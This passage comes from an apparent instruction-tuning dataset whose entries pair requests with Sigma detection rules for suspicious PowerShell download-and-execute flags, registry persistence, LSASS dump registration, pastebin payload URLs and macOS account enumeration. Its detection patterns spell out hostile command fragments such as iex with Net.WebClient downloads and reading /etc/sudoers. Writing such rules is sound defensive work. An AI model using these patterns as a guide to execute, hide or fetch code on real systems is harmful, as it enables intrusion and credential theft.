'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "suspicious PowerShell invocation command parameters",
      "answer": "In order to detect suspicious PowerShell invocation command parameters, you should:\n\nMonitor process creation logs within Windows environments for specific patterns in the command line arguments that could indicate malicious activity. Look for instances where PowerShell is invoked with combinations of switches and parameters often used in attacks to execute code, bypass execution policies, or hide the activity.\n\nSpecific detection patterns to watch for include:\n- Use of base64 encoding with the presence of parameters like '-nop' (bypasses PowerShell profiles), '-w', 'hidden' (attempts to hide windows), '-c' (execute command), and '[Convert]::FromBase64String' (indicates base64 encoded commands are being decoded and executed).\n- Invocation of PowerShell with flags such as '-noni' (non-interactive), '-nop', 'hidden', 'iex' (alias for Invoke-Expression, used to run strings as commands), and 'New-Object' (used to instantiate .NET objects, potentially for web requests or COM objects for lateral movements or data theft).\n- Use of encoded commands that bypass the execution policy with '-ep', 'bypass', and '-Enc' (encoded commands) along with attempts to run Windows invisibly with parameters like '-w' and 'hidden'.\n- Attempts to modify the system registry through PowerShell with identifiable flags and paths like 'powershell', 'reg', 'add', and a specific focus on '\\software\\' indicating changes to software entries.\n- Suspicious usage of PowerShell to invoke web requests with 'bypass', '-noprofile', 'hidden', and the creation of 'new-object' instances of 'system.net.webclient', followed by a download function call. This behavior often points to downloading and executing malicious scripts or tools from the internet.\n- Execution of PowerShell scripts that include 'iex', 'New-Object', 'Net.WebClient', and '.Download' commands in combination, indicating direct internet downloads and execution of potentially malicious content.\n\nIt's important to exclude known benign instances such as the downloading and execution of Chocolatey installation scripts, which might contain similar patterns but are recognized as legitimate.\n\nBy actively monitoring for these specific patterns, you can identify potentially malicious activities involving PowerShell, which is a common vector used by attackers to execute code, bypass security measures, and maintain stealth."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Find information about network devices that is not stored in config files.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to find information about network devices that is not stored in config files, you should examine logs for the Cisco Authentication, Authorization, and Accounting (AAA) services for specific keyword activity. These keywords signify commands that are often used for legitimate troubleshooting by administrators but could also be leveraged by attackers seeking to gather information about a network's infrastructure. Look for the execution of commands such as 'dir', 'show processes', 'show arp', 'show cdp', 'show version', 'show ip route', 'show ip interface', 'show ip sockets', 'show users', 'show ssh', and 'show clock'. These commands can reveal sensitive details about the network devices, configurations, connected peers, IP routing information, and even user information that are not typically stored in config files but are crucial for understanding the structure and security posture of a network. Monitor fields that include source IP, command set, user name, privilege level, and remote address for any activity. It is important to note that these activities are considered low level indicative of an attack due to their common use in routine administration and troubleshooting. Therefore, when these keywords are observed in the logs, it's necessary to contextually evaluate them considering their source, user, and frequency to accurately distinguish between normal administrative behavior and potential security threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'dir'\n        - 'show processes'\n        - 'show arp'\n        - 'show cdp'\n        - 'show version'\n        - 'show ip route'\n        - 'show ip interface'\n        - 'show ip sockets'\n        - 'show users'\n        - 'show ssh'\n        - 'show clock'\n    condition: keywords\nfields:\n    - src\n    - CmdSet\n    - User\n    - Privilege_Level\n    - Remote_Address\nfalsepositives:\n    - Commonly used by administrators for troubleshooting\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: cisco\n    service: aaa\ndetection:\n    keywords:\n        - 'dir'\n        - 'show processes'\n        - 'show arp'\n        - 'show cdp'\n        - 'show version'\n        - 'show ip route'\n        - 'show ip interface'\n        - 'show ip sockets'\n        - 'show users'\n        - 'show ssh'\n        - 'show clock'\n    condition: keywords\nfields:\n    - src\n    - CmdSet\n    - User\n    - Privilege_Level\n    - Remote_Address\nfalsepositives:\n    - Commonly used by administrators for troubleshooting\nlevel: low\n",
      "question": "Find information about network devices that is not stored in config files",
      "answer": "In order to find information about network devices that is not stored in config files, you should examine logs for the Cisco Authentication, Authorization, and Accounting (AAA) services for specific keyword activity. These keywords signify commands that are often used for legitimate troubleshooting by administrators but could also be leveraged by attackers seeking to gather information about a network's infrastructure. Look for the execution of commands such as 'dir', 'show processes', 'show arp', 'show cdp', 'show version', 'show ip route', 'show ip interface', 'show ip sockets', 'show users', 'show ssh', and 'show clock'. These commands can reveal sensitive details about the network devices, configurations, connected peers, IP routing information, and even user information that are not typically stored in config files but are crucial for understanding the structure and security posture of a network. Monitor fields that include source IP, command set, user name, privilege level, and remote address for any activity. It is important to note that these activities are considered low level indicative of an attack due to their common use in routine administration and troubleshooting. Therefore, when these keywords are observed in the logs, it's necessary to contextually evaluate them considering their source, user, and frequency to accurately distinguish between normal administrative behavior and potential security threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting modification of autostart extensibility point (ASEP) in registry..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring Windows registry settings for specific events and changes that signify potential unauthorized modifications aimed at enabling autostart mechanisms for malware or other unwanted programs. The analysis should be concentrated on registry set events, particularly the `SetValue` event type, which indicates an attempt to modify registry values.\n\nKey registry paths to monitor include various locations under the `SOFTWARE\\Wow6432Node\\Microsoft` and `SOFTWARE\\Microsoft` paths that are commonly targeted for persistence mechanisms, such as `AutoStart`, `Command Processor\\Autorun`, `Active Setup\\Installed Components`, and several others including `SYSTEM\\Setup\\CmdLine`, `Software\\Microsoft\\Ctf\\LangBarAddin`, and `Environment\\UserInitMprLogonScript`. \n\nFurthermore, entries relating to browser components (`Software\\Microsoft\\Internet Explorer\\UrlSearchHooks`, `SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components`, etc.), desktop components (`Control Panel\\Desktop\\Scrnsave.exe`), and protocol handlers (`SOFTWARE\\Classes\\Protocols\\Handler`, `Software\\Classes\\Protocols\\Filter`) are crucial to monitor due to their potential to be leveraged for persistence and execution through user interaction or system events.\n\nSpecial attention should be given to exclude modifications related to certain Microsoft Office, Chrome, Edge, and Internet Explorer components, as denoted by specific registry paths and details related to these applications, from triggering alerts to reduce false positives. This is achieved by filtering out changes occurring in specified registry locations related to Microsoft Office ClickToRun, Chrome, Edge, and Internet Explorer setup components, alongside some known benign executables (`poqexec.exe`, `integrator.exe` and `OfficeClickToRun.exe`).\n\nCrucially, ensuring that legitimate software installations and administrator-configured autorun keys are carefully distinguished from malicious modifications is imperative to maintain operational integrity and minimize instances of false alarms. \n\nThe successful detection strategy encompasses monitoring for modifications in the specified registry paths while excluding changes that are identified as legitimate through the listed exclusions. The key fields to be logged for further investigation are the SecurityID, ObjectName, OldValueType, and NewValueType, which provide essential information about the operation performed. This approach offers a balanced and focused method to detect and alert on potentially malicious ASEP modifications in the Windows registry with a medium level of confidence, aiming to protect against persistence and execution mechanisms commonly used by malware and unwanted software.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    main_selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows CE Services\\AutoStart'\n            - '\\Software\\Wow6432Node\\Microsoft\\Command Processor\\Autorun'\n            - '\\SOFTWARE\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components'\n            - '\\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnDisconnect'\n            - '\\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnConnect'\n            - '\\SYSTEM\\Setup\\CmdLine'\n            - '\\Software\\Microsoft\\Ctf\\LangBarAddin'\n            - '\\Software\\Microsoft\\Command Processor\\Autorun'\n            - '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components'\n            - '\\SOFTWARE\\Classes\\Protocols\\Handler'\n            - '\\SOFTWARE\\Classes\\Protocols\\Filter'\n            - '\\SOFTWARE\\Classes\\Htmlfile\\Shell\\Open\\Command\\(Default)'\n            - '\\Environment\\UserInitMprLogonScript'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\Scrnsave.exe'\n            - '\\Software\\Microsoft\\Internet Explorer\\UrlSearchHooks'\n            - '\\SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components'\n            - '\\Software\\Classes\\Clsid\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\Inprocserver32'\n            - '\\Control Panel\\Desktop\\Scrnsave.exe'\n    filter_empty:\n        Details: '(Empty)'\n    filter_msoffice:\n        - TargetObject|contains:\n            - '\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Classes\\PROTOCOLS\\Handler\\'\n            - '\\ClickToRunStore\\HKMU\\SOFTWARE\\Classes\\PROTOCOLS\\Handler\\'\n        - Details:\n            - '{314111c7-a502-11d2-bbca-00c04f8ec294}'\n            - '{3459B272-CC19-4448-86C9-DDC3B4B2FAD3}'\n            - '{42089D2D-912D-4018-9087-2B87803E93FB}'\n            - '{5504BE45-A83B-4808-900A-3A5C36E7F77A}'\n            - '{807583E5-5146-11D5-A672-00B0D022E945}'\n    filter_chrome:\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{8A69D345-D564-463c-AFF1-A69D9E530F96}'\n    filter_edge:\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{9459C573-B17A-45AE-9F64-1857B5D58CEE}'\n    filter_IE:\n        TargetObject|contains: '\\Software\\Microsoft\\Active Setup\\Installed Components\\{89820200-ECBD-11cf-8B85-00AA005B4383}'\n    filter_image:\n        Image:\n            - 'C:\\Windows\\System32\\poqexec.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe'\n    filter_office:\n        Image|startswith:\n            - 'C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\'\n            - 'C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\'\n        Image|endswith: '\\OfficeClickToRun.exe'\n    condition: main_selection and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    main_selection:\n        EventType: SetValue\n        TargetObject|contains:\n            - '\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows CE Services\\AutoStart'\n            - '\\Software\\Wow6432Node\\Microsoft\\Command Processor\\Autorun'\n            - '\\SOFTWARE\\Wow6432Node\\Microsoft\\Active Setup\\Installed Components'\n            - '\\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnDisconnect'\n            - '\\SOFTWARE\\Microsoft\\Windows CE Services\\AutoStartOnConnect'\n            - '\\SYSTEM\\Setup\\CmdLine'\n            - '\\Software\\Microsoft\\Ctf\\LangBarAddin'\n            - '\\Software\\Microsoft\\Command Processor\\Autorun'\n            - '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components'\n            - '\\SOFTWARE\\Classes\\Protocols\\Handler'\n            - '\\SOFTWARE\\Classes\\Protocols\\Filter'\n            - '\\SOFTWARE\\Classes\\Htmlfile\\Shell\\Open\\Command\\(Default)'\n            - '\\Environment\\UserInitMprLogonScript'\n            - '\\SOFTWARE\\Policies\\Microsoft\\Windows\\Control Panel\\Desktop\\Scrnsave.exe'\n            - '\\Software\\Microsoft\\Internet Explorer\\UrlSearchHooks'\n            - '\\SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components'\n            - '\\Software\\Classes\\Clsid\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\Inprocserver32'\n            - '\\Control Panel\\Desktop\\Scrnsave.exe'\n    filter_empty:\n        Details: '(Empty)'\n    filter_msoffice:\n        - TargetObject|contains:\n            - '\\Office\\ClickToRun\\REGISTRY\\MACHINE\\Software\\Classes\\PROTOCOLS\\Handler\\'\n            - '\\ClickToRunStore\\HKMU\\SOFTWARE\\Classes\\PROTOCOLS\\Handler\\'\n        - Details:\n            - '{314111c7-a502-11d2-bbca-00c04f8ec294}'\n            - '{3459B272-CC19-4448-86C9-DDC3B4B2FAD3}'\n            - '{42089D2D-912D-4018-9087-2B87803E93FB}'\n            - '{5504BE45-A83B-4808-900A-3A5C36E7F77A}'\n            - '{807583E5-5146-11D5-A672-00B0D022E945}'\n    filter_chrome:\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{8A69D345-D564-463c-AFF1-A69D9E530F96}'\n    filter_edge:\n        TargetObject|contains: '\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{9459C573-B17A-45AE-9F64-1857B5D58CEE}'\n    filter_IE:\n        TargetObject|contains: '\\Software\\Microsoft\\Active Setup\\Installed Components\\{89820200-ECBD-11cf-8B85-00AA005B4383}'\n    filter_image:\n        Image:\n            - 'C:\\Windows\\System32\\poqexec.exe'\n            - 'C:\\Program Files (x86)\\Microsoft Office\\root\\integration\\integrator.exe'\n    filter_office:\n        Image|startswith:\n            - 'C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\'\n            - 'C:\\Program Files\\Common Files\\Microsoft Shared\\ClickToRun\\Updates\\'\n        Image|endswith: '\\OfficeClickToRun.exe'\n    condition: main_selection and not 1 of filter_*\nfields:\n    - SecurityID\n    - ObjectName\n    - OldValueType\n    - NewValueType\nfalsepositives:\n    - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason\n    - Legitimate administrator sets up autorun keys for legitimate reason\nlevel: medium\n",
      "question": "modification of autostart extensibility point (ASEP) in registry.",
      "answer": "In order to detect modification of autostart extensibility point (ASEP) in registry, you should focus on monitoring Windows registry settings for specific events and changes that signify potential unauthorized modifications aimed at enabling autostart mechanisms for malware or other unwanted programs. The analysis should be concentrated on registry set events, particularly the `SetValue` event type, which indicates an attempt to modify registry values.\n\nKey registry paths to monitor include various locations under the `SOFTWARE\\Wow6432Node\\Microsoft` and `SOFTWARE\\Microsoft` paths that are commonly targeted for persistence mechanisms, such as `AutoStart`, `Command Processor\\Autorun`, `Active Setup\\Installed Components`, and several others including `SYSTEM\\Setup\\CmdLine`, `Software\\Microsoft\\Ctf\\LangBarAddin`, and `Environment\\UserInitMprLogonScript`. \n\nFurthermore, entries relating to browser components (`Software\\Microsoft\\Internet Explorer\\UrlSearchHooks`, `SOFTWARE\\Microsoft\\Internet Explorer\\Desktop\\Components`, etc.), desktop components (`Control Panel\\Desktop\\Scrnsave.exe`), and protocol handlers (`SOFTWARE\\Classes\\Protocols\\Handler`, `Software\\Classes\\Protocols\\Filter`) are crucial to monitor due to their potential to be leveraged for persistence and execution through user interaction or system events.\n\nSpecial attention should be given to exclude modifications related to certain Microsoft Office, Chrome, Edge, and Internet Explorer components, as denoted by specific registry paths and details related to these applications, from triggering alerts to reduce false positives. This is achieved by filtering out changes occurring in specified registry locations related to Microsoft Office ClickToRun, Chrome, Edge, and Internet Explorer setup components, alongside some known benign executables (`poqexec.exe`, `integrator.exe` and `OfficeClickToRun.exe`).\n\nCrucially, ensuring that legitimate software installations and administrator-configured autorun keys are carefully distinguished from malicious modifications is imperative to maintain operational integrity and minimize instances of false alarms. \n\nThe successful detection strategy encompasses monitoring for modifications in the specified registry paths while excluding changes that are identified as legitimate through the listed exclusions. The key fields to be logged for further investigation are the SecurityID, ObjectName, OldValueType, and NewValueType, which provide essential information about the operation performed. This approach offers a balanced and focused method to detect and alert on potentially malicious ASEP modifications in the Windows registry with a medium level of confidence, aiming to protect against persistence and execution mechanisms commonly used by malware and unwanted software."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process, you should: Monitor Windows registry events closely, focusing on any modifications made to the 'Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe' registry key. This specific registry path is critical because alterations here could indicate an attempt to silently exit or manipulate the Local Security Authority Subsystem Service (LSASS) process, which is often targeted by attackers seeking to dump credentials. The detection of such changes is considered critical, with false positives being unlikely, suggesting that any modifications to this registry path should be treated with a high level of scrutiny.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains: 'Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_event\n    product: windows\ndetection:\n    selection:\n        TargetObject|contains: 'Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process",
      "answer": "In order to detect changes to the Registry in which a monitor program gets registered to dump the memory of the lsass.exe process, you should: Monitor Windows registry events closely, focusing on any modifications made to the 'Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe' registry key. This specific registry path is critical because alterations here could indicate an attempt to silently exit or manipulate the Local Security Authority Subsystem Service (LSASS) process, which is often targeted by attackers seeking to dump credentials. The detection of such changes is considered critical, with false positives being unlikely, suggesting that any modifications to this registry path should be treated with a high level of scrutiny."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting VPN connection is modified or deleted..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to identify when a VPN connection is modified or deleted, you should monitor Azure Activity Logs for operations associated with the modification or deletion of VPN connections. Specifically, look out for actions named \"MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE\" and \"MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE.\" These operations indicate that a VPN Gateway's connection configuration is being changed or the connection is being removed entirely.\n\nIt's crucial to note that there could be legitimate reasons for these activities, such as a system administrator updating the VPN setup or removing outdated connections. Therefore, it's important to verify the identity of the user making these changes, the user agent involved, and whether the hostname associated with these actions is expected to perform such tasks within your environment.\n\nOn the other hand, if modifications or deletions are initiated by unfamiliar users or in an unusual manner, it warrants a deeper investigation. It might be necessary to exclude known and verified behaviors from your monitoring mechanisms to reduce the occurrence of false positives.\n\nThis approach aims to detect potential unauthorized access or malicious intentions to compromise network security by interfering with VPN configurations, maintaining a balance between security vigilance and allowing for legitimate administrative tasks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE\n            - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE\n    condition: selection\nfalsepositives:\n    - VPN Connection being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - VPN Connection modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: azure\n    service: activitylogs\ndetection:\n    selection:\n        operationName:\n            - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE\n            - MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE\n    condition: selection\nfalsepositives:\n    - VPN Connection being modified or deleted may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment.\n    - VPN Connection modified or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule.\nlevel: medium\n",
      "question": "VPN connection is modified or deleted.",
      "answer": "In order to identify when a VPN connection is modified or deleted, you should monitor Azure Activity Logs for operations associated with the modification or deletion of VPN connections. Specifically, look out for actions named \"MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/WRITE\" and \"MICROSOFT.NETWORK/VPNGATEWAYS/VPNCONNECTIONS/DELETE.\" These operations indicate that a VPN Gateway's connection configuration is being changed or the connection is being removed entirely.\n\nIt's crucial to note that there could be legitimate reasons for these activities, such as a system administrator updating the VPN setup or removing outdated connections. Therefore, it's important to verify the identity of the user making these changes, the user agent involved, and whether the hostname associated with these actions is expected to perform such tasks within your environment.\n\nOn the other hand, if modifications or deletions are initiated by unfamiliar users or in an unusual manner, it warrants a deeper investigation. It might be necessary to exclude known and verified behaviors from your monitoring mechanisms to reduce the occurrence of false positives.\n\nThis approach aims to detect potential unauthorized access or malicious intentions to compromise network security by interfering with VPN configurations, maintaining a balance between security vigilance and allowing for legitimate administrative tasks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form, you should: Monitor proxy logs for any URLs that contain certain keywords associated with popular pastebin services. Specifically, look for accesses to URLs that include '.paste.ee/r/', '.pastebin.com/raw/', '.hastebin.com/raw/', '.ghostbin.co/paste/*/raw/', 'pastetext.net/', 'pastebin.pl/', and 'paste.ee/'. These are common platforms where malicious code might be hosted, especially in its raw form which is often used in the delivery of malware during attack campaigns. Logs should record the Client IP address, the full requested URI (c-uri), and the client user agent string (c-useragent). It's important to recognize that there can be legitimate uses of these services, such as developers sharing code snippets, which might generate false positives. The severity level of this rule is set to high due to the potential risk associated with downloading and executing malicious code.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains:\n            - '.paste.ee/r/'\n            - '.pastebin.com/raw/'\n            - '.hastebin.com/raw/'\n            - '.ghostbin.co/paste/*/raw/'\n            - 'pastetext.net/'\n            - 'pastebin.pl/'\n            - 'paste.ee/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste)\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        c-uri|contains:\n            - '.paste.ee/r/'\n            - '.pastebin.com/raw/'\n            - '.hastebin.com/raw/'\n            - '.ghostbin.co/paste/*/raw/'\n            - 'pastetext.net/'\n            - 'pastebin.pl/'\n            - 'paste.ee/'\n    condition: selection\nfields:\n    - ClientIP\n    - c-uri\n    - c-useragent\nfalsepositives:\n    - User activity (e.g. developer that shared and copied code snippets and used the raw link instead of just copy & paste)\nlevel: high\n",
      "question": "direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form",
      "answer": "In order to detects direct access to raw pastes in different paste services often used by malware in their second stages to download malicious code in encrypted or encoded form, you should: Monitor proxy logs for any URLs that contain certain keywords associated with popular pastebin services. Specifically, look for accesses to URLs that include '.paste.ee/r/', '.pastebin.com/raw/', '.hastebin.com/raw/', '.ghostbin.co/paste/*/raw/', 'pastetext.net/', 'pastebin.pl/', and 'paste.ee/'. These are common platforms where malicious code might be hosted, especially in its raw form which is often used in the delivery of malware during attack campaigns. Logs should record the Client IP address, the full requested URI (c-uri), and the client user agent string (c-useragent). It's important to recognize that there can be legitimate uses of these services, such as developers sharing code snippets, which might generate false positives. The severity level of this rule is set to high due to the potential risk associated with downloading and executing malicious code."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting enumeration of local systeam accounts on MacOS.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect enumeration of local system accounts on MacOS, you should monitor process creation logs for specific command-line utilities and arguments indicative of such enumeration. The following activities should raise alerts: \n\n1. Execution of `/dscl` with command-line arguments that contain both 'list' and '/users', indicating an attempt to list local system users.\n2. Use of `/dscacheutil` with arguments '-q' and 'user', which is another method to query user account information.\n3. Any command-line operation that includes the pattern '''x:0:''', as this might indicate an attempt to find user accounts with specific attributes, potentially looking for root or other high-privileged accounts.\n4. Execution of `/cat` in conjunction with reading the contents of `/etc/passwd` or `/etc/sudoers`, which could reveal sensitive user and privilege information.\n5. The use of the `/id` command, which can display the user and group information for the current user, or when misused, could be used to gather information about other users.\n6. Running `/lsof` with the '-u' flag, indicating an attempt to list files opened by users, which could be used to infer active users or service accounts on the system.\n\nIt's important to consider that these actions may also align with legitimate administration activities, thus, they are flagged at a low level of concern. Continuous monitoring and context analysis are paramount to differentiate between benign and malicious activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection_1:\n        Image|endswith: '/dscl'\n        CommandLine|contains|all:\n            - 'list'\n            - '/users'\n    selection_2:\n        Image|endswith: '/dscacheutil'\n        CommandLine|contains|all:\n            - '-q'\n            - 'user'\n    selection_3:\n        CommandLine|contains: '''x:0:'''\n    selection_4:\n        Image|endswith: '/cat'\n        CommandLine|contains:\n            - '/etc/passwd'\n            - '/etc/sudoers'\n    selection_5:\n        Image|endswith: '/id'\n    selection_6:\n        Image|endswith: '/lsof'\n        CommandLine|contains: '-u'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: macos\ndetection:\n    selection_1:\n        Image|endswith: '/dscl'\n        CommandLine|contains|all:\n            - 'list'\n            - '/users'\n    selection_2:\n        Image|endswith: '/dscacheutil'\n        CommandLine|contains|all:\n            - '-q'\n            - 'user'\n    selection_3:\n        CommandLine|contains: '''x:0:'''\n    selection_4:\n        Image|endswith: '/cat'\n        CommandLine|contains:\n            - '/etc/passwd'\n            - '/etc/sudoers'\n    selection_5:\n        Image|endswith: '/id'\n    selection_6:\n        Image|endswith: '/lsof'\n        CommandLine|contains: '-u'\n    condition: 1 of selection*\nfalsepositives:\n    - Legitimate administration activities\nlevel: low\n",
      "question": "enumeration of local systeam accounts on MacOS",
      "answer": "In order to detect enumeration of local system accounts on MacOS, you should monitor process creation logs for specific command-line utilities and arguments indicative of such enumeration. The following activities should raise alerts: \n\n1. Execution of `/dscl` with command-line arguments that contain both 'list' and '/users', indicating an attempt to list local system users.\n2. Use of `/dscacheutil` with arguments '-q' and 'user', which is another method to query user account information.\n3. Any command-line operation that includes the pattern '''x:0:''', as this might indicate an attempt to find user accounts with specific attributes, potentially looking for root or other high-privileged accounts.\n4. Execution of `/cat` in conjunction with reading the contents of `/etc/passwd` or `/etc/sudoers`, which could reveal sensitive user and privilege information.\n5. The use of the `/id` command, which can display the user and group information for the current user, or when misused, could be used to gather information about other users.\n6. Running `/lsof` with the '-u' flag, indicating an attempt to list files opened by users, which could be used to infer active users or service accounts on the system.\n\nIt's important to consider that these actions may also align with legitimate administration activities, thus, they are flagged at a low level of concern. Continuous monitoring and context analysis are paramount to differentiate between benign and malicious activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting user is added to a privileged role..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when a user is added to a privileged role, you should: Monitor Azure audit logs for specific activities related to the addition of users to privileged roles. Specifically, look for log entries where the message indicates that an \"Add eligible member (permanent)\" or an \"Add eligible member (eligible)\" action has taken place. These log entries are critical to identify unauthorized or suspicious attempts to elevate privileges within an Azure environment. However, it's important to consider that there might be legitimate administrative actions where users are added to roles as part of normal operations, which could be considered as false positives. The severity level for this kind of activity is considered high due to the potential impact of unauthorized access to privileged roles.",
    "context": "",
